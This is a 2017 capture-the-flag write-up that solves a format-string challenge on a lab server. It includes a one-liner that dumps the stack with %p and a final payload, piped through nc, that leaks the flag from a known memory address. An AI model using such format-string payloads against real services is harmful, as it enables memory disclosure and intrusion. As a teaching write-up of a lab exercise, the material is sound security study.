---
title: "SHX8 : pwn100-basic_understanding"
date: "2017-04-25T13:41:17.000Z"
lastmod: "2017-06-05T15:25:52.000Z"
tags: ["ctf", "pwn", "shx8"]
slug: "shx8-pwn50-basic_understanding"
url: "/shx8-pwn50-basic_understanding/"
---
Jon has forgotten some basic knowledge about how memory is organized. Can you help him remember and solve this challenge?

IP: lab.shellterlabs.com   
PORT: 32771

## Solution

![](/content/images/2017/04/Selection_699.png)

Well, there's a clearly `format string` vulnerability here and the challenge description mentions `knowlegde about memory`.

We need to use `format string` to leak something from memory to catch the flag.. or even the flag itself is stored in the memory @ one of these variables below..

```
[+] text @ 0xfff633ac : -642132 = 0xfff633ac
[+] var  @ 0x0804a048 : 134520904 = 0x0804a048
[+] num  @ 0x0804a02c : 1 = 0x00000001
```

We don't have the binary to do some local reversing, but the server is showing the addresses where each variable are stored.

The first thing to do is figure out the `index/position` of our input on stack..

To do this send `JUNK` + `LOTS_OF_%p` to dump the stack

```bash
python -c 'print "AAAA"+"%p "*150 ' | nc lab.shellterlabs.com 32772
```

![](/content/images/2017/04/Selection_705.png)

hmm.. interesing things here:

```
position 147 = 0x0804a02c = num  
position 10 = where our input(AAAA) is stored
```

Now to dump the content of `0x0804a048` we need:

- put `0x0804a048` in the stack (in little endian)
- add some padding to hit `11th` position, I like to use `%08x.` to print a common 32bit memory layout `00000000.00000000.00000000..`
- we want to dump the string stored at this address, then add the `%s` string format specifier

```
printf..  
printf("\x48\xa0\x04\x080%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.#%s#");

our payload in py..  
"\x48\xa0\x04\x08" + "%08x."*10 + "#%s#"
```

![](/content/images/2017/04/Selection_703.png)

..and the server leaks our flag :)

It works because `printf` don't know how many args is placed on the stack for him, and when it hits the `%s` our padding already consumed all stack before and `printf` will dump `0x0804a048` content as string.

### Final exploit

```bash
python -c 'print "\x48\xa0\x04\x08"+"%08x."*10+"#%s#"' | nc lab.shellterlabs.com 32776
```

## References

- A Eulogy for Format String - <http://phrack.org/issues/67/9.html>
- Scut / team teso - Exploiting Format String Vulnerabilities white paper - <https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf>
